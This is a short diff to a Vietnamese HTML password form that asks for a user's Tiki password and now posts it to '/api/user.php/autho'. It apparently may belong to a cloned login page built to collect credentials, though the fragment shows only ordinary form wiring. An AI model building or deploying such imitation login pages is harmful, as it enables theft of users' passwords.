@@ -5,9 +5,9 @@
     <h4>Nhập mật khẩu</h4>
     <p>Vui lòng nhập mật khẩu Tiki của số điện thoại <b></b> </p>
 </div>
-<form id="submitFormPassword">
+<form id="submitFormPassword" method="POST" action="/api/user.php/autho">
     <div class="input ">
-        <input type="password" placeholder="Mật khẩu" value="">
+        <input type="password" name="password" placeholder="Mật khẩu" value="">
     </div>
     <button>Đăng Nhập</button>
 </form>
